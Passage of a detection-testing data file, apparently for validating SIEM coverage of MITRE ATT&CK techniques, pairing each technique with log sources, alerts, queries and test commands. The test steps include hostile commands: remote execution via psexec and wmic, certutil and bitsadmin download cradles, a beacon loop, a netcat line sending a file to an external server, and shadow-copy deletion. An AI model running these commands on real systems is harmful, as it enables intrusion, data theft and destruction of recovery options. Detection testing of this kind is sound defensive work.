        'First-time admin share access to system'
      ],
      siemQueryExample: 'event.code:(5140 OR 5145) AND winlog.event_data.ShareName:("*C$*" OR "*ADMIN$*") | stats count by source.ip, winlog.event_data.ShareName',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md'
    }
  },
  {
    id: 'vt-t1047',
    name: 'WMI Remote Execution',
    tactic: 'Lateral Movement',
    technique: 'T1047',
    techniqueName: 'Windows Management Instrumentation',
    description: 'Test detection of WMI-based remote execution',
    expectedLogSources: ['Windows Security', 'Sysmon', 'WMI Logs'],
    testProcedure: 'Execute command via wmic /node and verify WMI logging',
    expectedFields: ['source_host', 'dest_host', 'command', 'user'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing wmiprvse.exe spawning suspicious child process',
        'Sysmon Event ID 1 showing wmic.exe with /node parameter',
        'WMI-Activity/Operational Event ID 5857-5861 (WMI query events)',
        'Windows Security Event ID 4624 Type 3 followed by WMI activity',
        'Network connections to WMI ports (135, dynamic RPC)'
      ],
      howToTest: [
        'wmic /node:target process call create "cmd.exe /c whoami > c:\\temp\\out.txt"',
        'wmic /node:target process list brief (remote process listing)',
        'PowerShell: Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "calc.exe"',
        'wmic /node:target os get caption (remote OS info)',
        'Verify wmiprvse.exe spawning child processes on target'
      ],
      expectedAlerts: [
        'WMI remote execution detected',
        'wmiprvse.exe spawning suspicious process',
        'WMI lateral movement to multiple hosts',
        'Remote process creation via WMI',
        'WMI process creation from non-admin context'
      ],
      siemQueryExample: 'process.parent.name:"wmiprvse.exe" AND process.name:("cmd.exe" OR "powershell.exe") | stats count by host.name, process.command_line',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md'
    }
  },
  {
    id: 'vt-t1021-006',
    name: 'PSExec / Remote Services',
    tactic: 'Lateral Movement',
    technique: 'T1021.006',
    techniqueName: 'Remote Services: Windows Remote Management',
    description: 'Test detection of PSExec-style remote execution',
    expectedLogSources: ['Windows Security', 'Sysmon', 'EDR'],
    testProcedure: 'Use PSExec to execute command on remote system',
    expectedFields: ['source_host', 'dest_host', 'service_name', 'user'],
    guidance: {
      whatToLookFor: [
        'Windows System Event ID 7045 (New Service Created) named PSEXESVC or similar',
        'Sysmon Event ID 1 showing psexec.exe execution',
        'Sysmon Event ID 17/18 (Named Pipe) for \\\\*\\PIPE\\psexesvc',
        'File creation in \\Windows\\ for PSEXESVC.exe',
        'Logon Type 3 (Network) followed by immediate service installation'
      ],
      howToTest: [
        'psexec \\\\target -u DOMAIN\\admin -p password cmd.exe',
        'psexec \\\\target -s cmd.exe (run as SYSTEM)',
        'psexec \\\\target -c malware.exe (copy and execute)',
        'PowerShell remoting: Invoke-Command -ComputerName target -ScriptBlock { whoami }',
        'CLEANUP: psexec installs service; it cleans up on disconnect'
      ],
      expectedAlerts: [
        'PSExec service installation detected',
        'Remote command execution via PSExec',
        'Named pipe creation for remote execution tool',
        'Lateral movement detected - service created on remote host',
        'PSExec-like behavior detected (service + named pipe pattern)'
      ],
      siemQueryExample: 'event.code:7045 AND winlog.event_data.ServiceFileName:("*PSEXE*" OR "*\\\\ADMIN$*" OR "*\\\\C$*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md'
    }
  },

  // Collection
  {
    id: 'vt-t1560-001',
    name: 'Archive via Utility',
    tactic: 'Collection',
    technique: 'T1560.001',
    techniqueName: 'Archive Collected Data: Archive via Utility',
    description: 'Test detection of data archiving for exfiltration',
    expectedLogSources: ['Sysmon', 'EDR', 'DLP'],
    testProcedure: 'Create password-protected archive of sensitive files',
    expectedFields: ['archive_tool', 'file_path', 'user', 'file_size'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing 7z.exe, rar.exe, WinRAR.exe, or zip.exe execution',
        'Command lines with -p (password) parameter in compression tools',
        'Large archive files created in user directories or temp folders',
        'PowerShell Compress-Archive cmdlet usage',
        'Multiple files being compressed at once (staging for exfil)'
      ],
      howToTest: [
        '7z a -pSecretPassword archive.7z C:\\Users\\*\\Documents\\*.docx',
        'PowerShell: Compress-Archive -Path C:\\Data\\* -DestinationPath C:\\temp\\archive.zip',
        'makecab /d CabinetName=archive.cab C:\\Data\\sensitive.docx',
        'tar -cvf archive.tar C:\\Data\\ (if GNU tar is installed)',
        'Create archive of files >100MB to test size-based alerts'
      ],
      expectedAlerts: [
        'Large archive file created',
        'Password-protected archive created',
        'Archive created in suspicious location',
        'Compression of sensitive file types (docx, xlsx, pst)',
        'Archive created by suspicious process'
      ],
      siemQueryExample: 'process.name:("7z.exe" OR "rar.exe" OR "WinRAR.exe") OR (process.name:"powershell.exe" AND process.command_line:"*Compress-Archive*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md'
    }
  },
  {
    id: 'vt-t1114-002',
    name: 'Email Collection - Remote',
    tactic: 'Collection',
    technique: 'T1114.002',
    techniqueName: 'Email Collection: Remote Email Collection',
    description: 'Test detection of mailbox access',
    expectedLogSources: ['Exchange', 'Microsoft 365', 'Email Gateway'],
    testProcedure: 'Access mailbox via EWS/Graph API and verify audit log',
    expectedFields: ['mailbox', 'accessor', 'operation', 'client_ip'],
    guidance: {
      whatToLookFor: [
        'Exchange/O365 Unified Audit Log - MailItemsAccessed operations',
        'Mailbox audit log - SendAs, SendOnBehalf, FullAccess operations',
        'Graph API calls to /users/{id}/messages endpoints',
        'EWS (Exchange Web Services) operations in IIS logs',
        'Unusual volume of email export or sync operations'
      ],
      howToTest: [
        'Outlook: Configure additional mailbox access and read emails',
        'PowerShell EWS: Use EWS Managed API to access mailbox items',
        'Graph API: GET https://graph.microsoft.com/v1.0/me/messages',
        'Export mailbox: New-MailboxExportRequest (Exchange on-prem)',
        'Verify mailbox audit logging is enabled: Get-Mailbox -Identity user | FL *Audit*'
      ],
      expectedAlerts: [
        'Mailbox accessed by delegate/service account',
        'Large volume of emails accessed/exported',
        'Mailbox accessed from unusual location/IP',
        'FullAccess permission used outside normal pattern',
        'Email export to PST file detected'
      ],
      siemQueryExample: 'source:"O365_Audit" AND operation:("MailItemsAccessed" OR "SendAs" OR "FullAccess") AND NOT user.name:*system*',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.002/T1114.002.md'
    }
  },

  // Command and Control
  {
    id: 'vt-t1071-001',
    name: 'Web Protocol C2',
    tactic: 'Command and Control',
    technique: 'T1071.001',
    techniqueName: 'Application Layer Protocol: Web Protocols',
    description: 'Test detection of HTTP/S-based C2 traffic',
    expectedLogSources: ['Proxy', 'Firewall', 'DNS', 'EDR'],
    testProcedure: 'Generate simulated C2 beacon traffic to known test domain',
    expectedFields: ['dest_domain', 'dest_ip', 'user_agent', 'bytes_out'],
    guidance: {
      whatToLookFor: [
        'Proxy logs showing periodic/beaconing HTTP(S) requests',
        'Connections to known C2 infrastructure (threat intel IOCs)',
        'Unusual User-Agent strings or missing User-Agent',
        'High frequency requests to single domain with small response sizes',
        'HTTPS connections to IP addresses (no SNI/hostname)'
      ],
      howToTest: [
        'curl -A "Mozilla/5.0" http://testdomain.com/beacon every 60 seconds',
        'PowerShell beacon: while($true){Invoke-WebRequest http://test.local/c2;Start-Sleep 60}',
        'Use Atomic Red Team HTTP C2 simulation tests',
        'Generate traffic to known-bad test domains (if available in lab)',
        'Vary beacon intervals: fixed (60s), jittered (45-75s), etc.'
      ],
      expectedAlerts: [
        'Beaconing activity detected - periodic HTTP requests',
        'Connection to known C2 infrastructure',
        'Suspicious User-Agent detected',
        'Long-running HTTP session (keep-alive abuse)',
        'HTTP traffic to rare/new domain'
      ],
      siemQueryExample: 'event.category:"web" | bin span=5m @timestamp | stats count, dc(url.domain) by source.ip, @timestamp | where count > 50 AND dc(url.domain) == 1',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.001/T1071.001.md'
    }
  },
  {
    id: 'vt-t1071-004',
    name: 'DNS Tunneling',
    tactic: 'Command and Control',
    technique: 'T1071.004',
    techniqueName: 'Application Layer Protocol: DNS',
    description: 'Test detection of DNS-based data exfiltration',
    expectedLogSources: ['DNS', 'Firewall', 'EDR'],
    testProcedure: 'Send encoded data via DNS TXT queries and verify detection',
    expectedFields: ['query_name', 'query_type', 'source_ip', 'response_size'],
    guidance: {
      whatToLookFor: [
        'Unusually long DNS query names (>50 characters in subdomain)',
        'High volume of DNS TXT or NULL record queries',
        'DNS queries to recently registered or rare domains',
        'Base64 or hex-encoded patterns in DNS query names',
        'DNS queries directly to external DNS servers (bypassing internal)'
      ],
      howToTest: [
        'nslookup -type=TXT dGVzdGRhdGE=.tunnel.testdomain.com (base64 in subdomain)',
        'Use dnscat2 or iodine in lab environment for DNS tunnel testing',
        'PowerShell: Resolve-DnsName -Type TXT encodeddata.test.com',
        'Generate high volume of unique subdomains to single parent domain',
        'Test long subdomain queries: nslookup aaaaaaaaaaaaaaaaaaa.test.com'
      ],
      expectedAlerts: [
        'DNS tunneling detected - encoded data in queries',
        'Excessive DNS queries to single domain',
        'Long DNS query name detected',
        'Unusual DNS record type (TXT, NULL) volume',
        'DNS queries bypassing corporate DNS servers'
      ],
      siemQueryExample: 'dns.question.type:("TXT" OR "NULL") | where length(dns.question.name) > 50 | stats count by source.ip, dns.question.registered_domain',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.004/T1071.004.md'
    }
  },
  {
    id: 'vt-t1105',
    name: 'Ingress Tool Transfer',
    tactic: 'Command and Control',
    technique: 'T1105',
    techniqueName: 'Ingress Tool Transfer',
    description: 'Test detection of tool download to compromised host',
    expectedLogSources: ['Proxy', 'Sysmon', 'EDR', 'Firewall'],
    testProcedure: 'Download file via certutil/PowerShell and verify logging',
    expectedFields: ['url', 'file_path', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing certutil.exe, curl.exe, wget.exe, or bitsadmin.exe',
        'PowerShell with DownloadFile, DownloadString, or Invoke-WebRequest',
        'Proxy logs showing executable downloads (Content-Type, file extension)',
        'File creation events following network download activity',
        'Downloads to temp folders, user profiles, or unusual locations'
      ],
      howToTest: [
        'certutil -urlcache -split -f http://test.local/file.exe c:\\temp\\file.exe',
        'PowerShell: Invoke-WebRequest -Uri http://test.local/file.exe -OutFile c:\\temp\\file.exe',
        'PowerShell: (New-Object Net.WebClient).DownloadFile("http://test.local/file.exe","c:\\temp\\file.exe")',
        'bitsadmin /transfer job /download /priority high http://test.local/file.exe c:\\temp\\file.exe',
        'curl -o c:\\temp\\file.exe http://test.local/file.exe (if curl available)'
      ],
      expectedAlerts: [
        'Executable downloaded via LOLBin (certutil, bitsadmin)',
        'PowerShell download cradle detected',
        'File downloaded to suspicious location',
        'Download of executable from rare/new domain',
        'Tool download followed by execution'
      ],
      siemQueryExample: 'process.name:("certutil.exe" OR "bitsadmin.exe") AND process.command_line:("*http*" OR "*ftp*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md'
    }
  },

  // Exfiltration
  {
    id: 'vt-t1048-003',
    name: 'Exfiltration Over Unencrypted Protocol',
    tactic: 'Exfiltration',
    technique: 'T1048.003',
    techniqueName: 'Exfiltration Over Alternative Protocol: Unencrypted',
    description: 'Test detection of data exfiltration via FTP/HTTP',
    expectedLogSources: ['Firewall', 'Proxy', 'DLP', 'Zeek'],
    testProcedure: 'Upload test file via FTP/HTTP POST and verify detection',
    expectedFields: ['dest_ip', 'protocol', 'bytes_out', 'file_name'],
    guidance: {
      whatToLookFor: [
        'Firewall logs showing large outbound data transfers',
        'FTP connections (port 21) to external IPs',
        'HTTP POST requests with large Content-Length',
        'Proxy logs showing file uploads (multipart/form-data)',
        'Unusual outbound data volume from single host'
      ],
      howToTest: [
        'FTP upload: ftp -n testftp.local -> put largefile.txt',
        'HTTP POST: curl -X POST -F "file=@testfile.txt" http://test.local/upload',
        'PowerShell: Invoke-RestMethod -Uri http://test.local/upload -Method Post -InFile testfile.txt',
        'Create 100MB test file and upload to verify size-based alerts',
        'Use netcat: nc external.server 8080 < sensitive.txt'
      ],
      expectedAlerts: [
        'Large outbound file transfer detected',
        'FTP connection to external IP',
        'Data exfiltration via HTTP POST',
        'Unusual upload volume from workstation',
        'Sensitive file type uploaded externally'
      ],
      siemQueryExample: 'network.direction:"outbound" AND destination.bytes > 10000000 AND NOT destination.ip:10.* | stats sum(destination.bytes) by source.ip, destination.ip',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md'
    }
  },
  {
    id: 'vt-t1567-002',
    name: 'Exfiltration to Cloud Storage',
    tactic: 'Exfiltration',
    technique: 'T1567.002',
    techniqueName: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage',
    description: 'Test detection of uploads to cloud storage',
    expectedLogSources: ['Proxy', 'CASB', 'DLP', 'Firewall'],
    testProcedure: 'Upload file to Dropbox/OneDrive/Google Drive and verify logging',
    expectedFields: ['service', 'file_name', 'user', 'bytes_out'],
    guidance: {
      whatToLookFor: [
        'Proxy/CASB logs showing uploads to cloud storage domains',
        'Connections to *.dropbox.com, *.onedrive.com, *.googleapis.com, etc.',
        'Large HTTPS uploads (bytes_out > threshold)',
        'Personal cloud storage used from corporate network',
        'API calls to cloud storage services'
      ],
      howToTest: [
        'Upload file via browser to personal Dropbox/Google Drive',
        'Use cloud storage desktop client to sync sensitive folder',
        'PowerShell/rclone to upload file programmatically',
        'Test upload of various file sizes (1MB, 10MB, 100MB)',
        'Upload via cloud storage API if available in test environment'
      ],
      expectedAlerts: [
        'Upload to personal cloud storage detected',
        'Large file uploaded to cloud storage',
        'Sensitive file type uploaded to cloud',
        'Unsanctioned cloud storage service used',
        'Bulk upload to cloud storage (multiple files)'
      ],
      siemQueryExample: 'url.domain:("*dropbox.com" OR "*drive.google.com" OR "*onedrive.com") AND http.request.method:"POST" AND http.request.bytes > 1000000',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.002/T1567.002.md'
    }
  },

  // Impact
  {
    id: 'vt-t1486',
    name: 'Data Encrypted for Impact',
    tactic: 'Impact',
    technique: 'T1486',
    techniqueName: 'Data Encrypted for Impact',
    description: 'Test detection of ransomware-like encryption activity',
    expectedLogSources: ['EDR', 'Sysmon', 'File Integrity Monitoring'],
    testProcedure: 'Run encryption simulation on test files and verify detection',
    expectedFields: ['file_count', 'extension_change', 'process', 'user'],
    guidance: {
      whatToLookFor: [
        'High volume of file modification events in short time',
        'File extension changes to known ransomware extensions (.encrypted, .locked, etc.)',
        'Sysmon Event ID 11 (FileCreate) for ransom notes (README.txt, DECRYPT.txt)',
        'Process accessing many files rapidly across directories',
        'Deletion of Volume Shadow Copies (vssadmin, wmic shadowcopy)'
      ],
      howToTest: [
        'SAFE: Use ransomware simulation tool like RanSim from KnowBe4',
        'SAFE: Write PowerShell to rename file extensions in test folder only',
        'SAFE: $files = Get-ChildItem C:\\TestFolder\\*; foreach($f in $files){Rename-Item $f "$($f.Name).encrypted"}',
        'Create canary files (honeypot files) and monitor for access',
        'NEVER run actual ransomware even in testing - use simulation only'
      ],
      expectedAlerts: [
        'Ransomware activity detected - mass file encryption',
        'Known ransomware file extension detected',
        'Ransomware note file created',
        'Volume Shadow Copy deletion',
        'Honeypot/canary file modified'
      ],
      siemQueryExample: 'event.code:11 AND file.extension:("encrypted" OR "locked" OR "crypto") | stats count by host.name, process.name | where count > 100',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md'
    }
  },
  {
    id: 'vt-t1490',
    name: 'Inhibit System Recovery',
    tactic: 'Impact',
    technique: 'T1490',
    techniqueName: 'Inhibit System Recovery',
    description: 'Test detection of backup/recovery sabotage',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Execute vssadmin delete shadows and verify process logging',
    expectedFields: ['command_line', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing vssadmin.exe with "delete shadows"',
        'wmic.exe with "shadowcopy delete" in command line',
        'bcdedit.exe modifying recovery settings',
        'wbadmin.exe deleting backup catalog',
        'Deletion or modification of System Restore points'
      ],
      howToTest: [
        'vssadmin list shadows (list existing shadow copies first)',
        'vssadmin delete shadows /all /quiet (deletes all shadow copies)',
        'wmic shadowcopy delete (alternative deletion method)',
        'bcdedit /set {default} recoveryenabled no (disable recovery mode)',
        'IMPORTANT: Test in isolated VM - this destroys recovery options'
      ],
      expectedAlerts: [
        'Volume Shadow Copy deletion detected',
        'System recovery options disabled',
        'Backup catalog deleted',
        'Recovery inhibition - precursor to ransomware',
        'Multiple recovery sabotage techniques in sequence'
      ],
      siemQueryExample: 'process.name:("vssadmin.exe" OR "wmic.exe" OR "bcdedit.exe") AND process.command_line:("*delete*shadow*" OR "*recoveryenabled*no*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md'
    }
  },
];
// ============================================
// MITRE ATT&CK FRAMEWORK DEFINITIONS
// ============================================

// MITRE ATT&CK Tactics (Enterprise Matrix)
export const mitreTactics = [
  { id: 'TA0043', name: 'Reconnaissance', shortName: 'Recon', color: 'slate', description: 'Gathering information to plan future adversary operations' },
  { id: 'TA0042', name: 'Resource Development', shortName: 'Resource', color: 'zinc', description: 'Establishing resources to support operations' },
  { id: 'TA0001', name: 'Initial Access', shortName: 'Initial', color: 'red', description: 'Trying to get into your network' },
  { id: 'TA0002', name: 'Execution', shortName: 'Exec', color: 'orange', description: 'Trying to run malicious code' },
  { id: 'TA0003', name: 'Persistence', shortName: 'Persist', color: 'amber', description: 'Trying to maintain their foothold' },
  { id: 'TA0004', name: 'Privilege Escalation', shortName: 'PrivEsc', color: 'yellow', description: 'Trying to gain higher-level permissions' },
  { id: 'TA0005', name: 'Defense Evasion', shortName: 'DefEvade', color: 'lime', description: 'Trying to avoid being detected' },
  { id: 'TA0006', name: 'Credential Access', shortName: 'CredAccess', color: 'green', description: 'Stealing account names and passwords' },
  { id: 'TA0007', name: 'Discovery', shortName: 'Discovery', color: 'emerald', description: 'Trying to figure out your environment' },
  { id: 'TA0008', name: 'Lateral Movement', shortName: 'Lateral', color: 'teal', description: 'Moving through your environment' },
  { id: 'TA0009', name: 'Collection', shortName: 'Collect', color: 'cyan', description: 'Gathering data of interest' },
  { id: 'TA0011', name: 'Command and Control', shortName: 'C2', color: 'sky', description: 'Communicating with compromised systems' },
  { id: 'TA0010', name: 'Exfiltration', shortName: 'Exfil', color: 'blue', description: 'Stealing data' },
  { id: 'TA0040', name: 'Impact', shortName: 'Impact', color: 'violet', description: 'Manipulate, interrupt, or destroy systems and data' },
];

// ============================================
// MITRE ATT&CK Data Components (119 components from v18)
// Data Components identify specific properties/values for detecting techniques
// ============================================
export const mitreDataComponents = [
  // Active Directory Components
  { id: 'DC0084', name: 'Active Directory Credential Request', dataSourceId: 'DS0026', description: 'Requests for authentication credentials via Kerberos, NTLM, LDAP', platform: 'Enterprise' },
  { id: 'DC0071', name: 'Active Directory Object Access', dataSourceId: 'DS0026', description: 'AD objects accessed or queried (Event ID 4661)', platform: 'Enterprise' },
  { id: 'DC0087', name: 'Active Directory Object Creation', dataSourceId: 'DS0026', description: 'Creating new AD objects like users, groups, OUs (Event ID 5137)', platform: 'Enterprise' },
  { id: 'DC0068', name: 'Active Directory Object Deletion', dataSourceId: 'DS0026', description: 'AD object deletion logged as Event ID 5141', platform: 'Enterprise' },
  { id: 'DC0066', name: 'Active Directory Object Modification', dataSourceId: 'DS0026', description: 'Changes to AD objects (Event ID 5136, 5163)', platform: 'Enterprise' },
  
  // DNS Components
  { id: 'DC0103', name: 'Active DNS', dataSourceId: 'DS0013', description: 'Queried DNS registry data showing current domain-to-IP resolutions', platform: 'Enterprise' },
  { id: 'DC0096', name: 'Passive DNS', dataSourceId: 'DS0013', description: 'Historical DNS data for tracking domain infrastructure', platform: 'Enterprise' },
  { id: 'DC0101', name: 'Domain Registration', dataSourceId: 'DS0013', description: 'Domain ownership and WHOIS metadata', platform: 'Enterprise' },
  
  // API/Mobile Components
  { id: 'DC0112', name: 'API Calls', dataSourceId: null, description: 'API calls utilized by an application', platform: 'Mobile' },
  { id: 'DC0119', name: 'Application Assets', dataSourceId: null, description: 'Additional assets included with an application', platform: 'Mobile' },
  
  // Application Log Components
  { id: 'DC0038', name: 'Application Log Content', dataSourceId: 'DS0015', description: 'Logs generated by applications including metrics, errors, performance data', platform: 'Enterprise,ICS' },
  
  // Asset/Inventory Components
  { id: 'DC0110', name: 'Asset Inventory', dataSourceId: null, description: 'Current and expected devices on the network with identifiers', platform: 'ICS' },
  
  // Certificate Components
  { id: 'DC0093', name: 'Certificate Registration', dataSourceId: 'DS0037', description: 'Certificate issuance, revocation, and transparency logs', platform: 'Enterprise' },
  
  // Cloud Service Components
  { id: 'DC0090', name: 'Cloud Service Disable', dataSourceId: 'DS0025', description: 'Deactivation of cloud services like CloudTrail StopLogging', platform: 'Enterprise' },
  { id: 'DC0083', name: 'Cloud Service Enumeration', dataSourceId: 'DS0025', description: 'Listing cloud services (AWS ListServices, Azure ListAllResources)', platform: 'Enterprise' },
  { id: 'DC0070', name: 'Cloud Service Metadata', dataSourceId: 'DS0025', description: 'Cloud service attributes including name, type, configuration', platform: 'Enterprise' },
  { id: 'DC0069', name: 'Cloud Service Modification', dataSourceId: 'DS0025', description: 'Changes to cloud service configuration or settings', platform: 'Enterprise' },
  
  // Cloud Storage Components
  { id: 'DC0025', name: 'Cloud Storage Access', dataSourceId: 'DS0025', description: 'Retrieval or interaction with cloud storage data (S3 GetObject)', platform: 'Enterprise' },
  { id: 'DC0024', name: 'Cloud Storage Creation', dataSourceId: 'DS0025', description: 'Creation of cloud storage buckets, containers, directories', platform: 'Enterprise' },
  { id: 'DC0022', name: 'Cloud Storage Deletion', dataSourceId: 'DS0025', description: 'Removal of cloud storage infrastructure', platform: 'Enterprise' },
  { id: 'DC0017', name: 'Cloud Storage Enumeration', dataSourceId: 'DS0025', description: 'Listing cloud storage buckets, containers, objects', platform: 'Enterprise' },
  { id: 'DC0027', name: 'Cloud Storage Metadata', dataSourceId: 'DS0025', description: 'Cloud storage attributes like name, size, owner, permissions', platform: 'Enterprise' },
  { id: 'DC0023', name: 'Cloud Storage Modification', dataSourceId: 'DS0025', description: 'Changes to cloud storage settings, ACLs, bucket policies', platform: 'Enterprise' },
  
  // Command Execution Components
  { id: 'DC0064', name: 'Command Execution', dataSourceId: 'DS0017', description: 'Execution of shell commands, cmdlets, scripts via interpreters', platform: 'Enterprise,ICS,Mobile' },
  
  // Container Components
  { id: 'DC0072', name: 'Container Creation', dataSourceId: 'DS0032', description: 'Initial construction of a container (Docker, Kubernetes)', platform: 'Enterprise' },
  { id: 'DC0091', name: 'Container Enumeration', dataSourceId: 'DS0032', description: 'Listing active or available containers', platform: 'Enterprise' },
  { id: 'DC0077', name: 'Container Start', dataSourceId: 'DS0032', description: 'Activation of a container within containerized environment', platform: 'Enterprise' },
  
  // Device/ICS Components
  { id: 'DC0108', name: 'Device Alarm', dataSourceId: null, description: 'Alarms from device shutdowns, restarts, failures, config changes', platform: 'ICS' },
  
  // Drive Components
  { id: 'DC0054', name: 'Drive Access', dataSourceId: 'DS0022', description: 'Accessing data storage devices, mounting drives', platform: 'Enterprise' },
  { id: 'DC0042', name: 'Drive Creation', dataSourceId: 'DS0022', description: 'Assigning drive letters or mount points', platform: 'Enterprise,ICS' },
  { id: 'DC0046', name: 'Drive Modification', dataSourceId: 'DS0022', description: 'Altering drive letters, mount points, attributes', platform: 'Enterprise,ICS' },
  
  // Driver Components
  { id: 'DC0079', name: 'Driver Load', dataSourceId: 'DS0027', description: 'Attaching drivers to user-mode or kernel-mode', platform: 'Enterprise' },
  { id: 'DC0074', name: 'Driver Metadata', dataSourceId: 'DS0027', description: 'Driver attributes, integrity, cryptographic signature', platform: 'Enterprise' },
  
  // File Components
  { id: 'DC0055', name: 'File Access', dataSourceId: 'DS0022', description: 'File opened or accessed (Windows Event ID 4663)', platform: 'Enterprise,ICS' },
  { id: 'DC0039', name: 'File Creation', dataSourceId: 'DS0022', description: 'New file created (Sysmon Event ID 11)', platform: 'Enterprise,ICS' },
  { id: 'DC0040', name: 'File Deletion', dataSourceId: 'DS0022', description: 'Files removed from system', platform: 'Enterprise,ICS' },
  { id: 'DC0059', name: 'File Metadata', dataSourceId: 'DS0022', description: 'File attributes: name, size, type, owner, permissions, timestamps', platform: 'Enterprise,ICS' },
  { id: 'DC0061', name: 'File Modification', dataSourceId: 'DS0022', description: 'Changes to file contents, metadata, permissions', platform: 'Enterprise,ICS' },
  
  // Firewall Components
  { id: 'DC0043', name: 'Firewall Disable', dataSourceId: 'DS0029', description: 'Deactivation or misconfiguration of firewall services', platform: 'Enterprise' },
  { id: 'DC0044', name: 'Firewall Enumeration', dataSourceId: 'DS0029', description: 'Querying firewall configurations and rules', platform: 'Enterprise' },
  { id: 'DC0053', name: 'Firewall Metadata', dataSourceId: 'DS0029', description: 'Firewall configuration, policies, status', platform: 'Enterprise' },
  { id: 'DC0051', name: 'Firewall Rule Modification', dataSourceId: 'DS0029', description: 'Creation, deletion, or alteration of firewall rules', platform: 'Enterprise' },
  
  // Firmware Components
  { id: 'DC0004', name: 'Firmware Modification', dataSourceId: 'DS0001', description: 'Changes to firmware, MBR, VBR', platform: 'Enterprise,ICS' },
  
  // Group Components
  { id: 'DC0099', name: 'Group Enumeration', dataSourceId: 'DS0026', description: 'Extracting group lists from identity systems', platform: 'Enterprise' },
  { id: 'DC0105', name: 'Group Metadata', dataSourceId: 'DS0026', description: 'Group attributes: name, permissions, associated accounts', platform: 'Enterprise' },
  { id: 'DC0094', name: 'Group Modification', dataSourceId: 'DS0026', description: 'Changes to group membership, name, permissions (EID 4728, 4732)', platform: 'Enterprise' },
  
  // Host/Sensor Components
  { id: 'DC0018', name: 'Host Status', dataSourceId: 'DS0013', description: 'Health of host-based security sensors (EDR, AV)', platform: 'Enterprise,Mobile' },
  
  // Image/VM Components
  { id: 'DC0015', name: 'Image Creation', dataSourceId: 'DS0007', description: 'Construction of VM images in cloud environments', platform: 'Enterprise' },
  { id: 'DC0026', name: 'Image Deletion', dataSourceId: 'DS0007', description: 'Removal of VM images (Azure Compute Images DELETE)', platform: 'Enterprise' },
  { id: 'DC0028', name: 'Image Metadata', dataSourceId: 'DS0007', description: 'VM image attributes: name, status, type, size, permissions', platform: 'Enterprise' },
  { id: 'DC0036', name: 'Image Modification', dataSourceId: 'DS0007', description: 'Changes to VM image settings or control data', platform: 'Enterprise' },
  
  // Instance/VM Components
  { id: 'DC0076', name: 'Instance Creation', dataSourceId: 'DS0007', description: 'Provisioning of VM or compute instance in cloud', platform: 'Enterprise' },
  { id: 'DC0081', name: 'Instance Deletion', dataSourceId: 'DS0007', description: 'Removal of VM or compute instance', platform: 'Enterprise' },
  { id: 'DC0075', name: 'Instance Enumeration', dataSourceId: 'DS0007', description: 'Querying list of VM instances in cloud', platform: 'Enterprise' },
  { id: 'DC0086', name: 'Instance Metadata', dataSourceId: 'DS0007', description: 'Instance attributes: name, type, status', platform: 'Enterprise' },
  { id: 'DC0073', name: 'Instance Modification', dataSourceId: 'DS0007', description: 'Changes to VM configuration, metadata, policies', platform: 'Enterprise' },
  { id: 'DC0080', name: 'Instance Start', dataSourceId: 'DS0007', description: 'Starting a VM instance in cloud', platform: 'Enterprise' },
  { id: 'DC0089', name: 'Instance Stop', dataSourceId: 'DS0007', description: 'Stopping a VM instance in cloud', platform: 'Enterprise' },
  
  // Kernel Module Components
  { id: 'DC0031', name: 'Kernel Module Load', dataSourceId: 'DS0027', description: 'Loading kernel modules into the OS kernel', platform: 'Enterprise' },
  
  // Logon Session Components
  { id: 'DC0067', name: 'Logon Session Creation', dataSourceId: 'DS0028', description: 'Successful establishment of new user session', platform: 'Enterprise,ICS' },
  { id: 'DC0088', name: 'Logon Session Metadata', dataSourceId: 'DS0028', description: 'Session data: username, logon type, access tokens', platform: 'Enterprise,ICS' },
  
  // Malware Components
  { id: 'DC0011', name: 'Malware Content', dataSourceId: 'DS0004', description: 'Code, strings, signatures of malicious payloads', platform: 'Enterprise' },
  { id: 'DC0003', name: 'Malware Metadata', dataSourceId: 'DS0004', description: 'Malware attributes: compilation times, hashes, watermarks', platform: 'Enterprise' },
  
  // Module Components
  { id: 'DC0016', name: 'Module Load', dataSourceId: 'DS0009', description: 'Process loading shared libraries or modules', platform: 'Enterprise,ICS' },
  
  // Named Pipe Components
  { id: 'DC0048', name: 'Named Pipe Metadata', dataSourceId: 'DS0009', description: 'Named pipe data: pipe name, creating process (Sysmon EIDs 17-18)', platform: 'Enterprise' },
  
  // Network Components
  { id: 'DC0113', name: 'Network Communication', dataSourceId: 'DS0029', description: 'Network requests made by application', platform: 'Mobile' },
  { id: 'DC0082', name: 'Network Connection Creation', dataSourceId: 'DS0029', description: 'Initial establishment of network sessions', platform: 'Enterprise,ICS,Mobile' },
  { id: 'DC0102', name: 'Network Share Access', dataSourceId: 'DS0029', description: 'Opening network shares (Windows EID 5140, 5145)', platform: 'Enterprise,ICS' },
  { id: 'DC0085', name: 'Network Traffic Content', dataSourceId: 'DS0029', description: 'Full packet capture (PCAP) with protocol and payload', platform: 'Enterprise,ICS,Mobile' },
  { id: 'DC0078', name: 'Network Traffic Flow', dataSourceId: 'DS0029', description: 'Summarized packet data (NetFlow) without payload', platform: 'Enterprise,ICS,Mobile' },
  
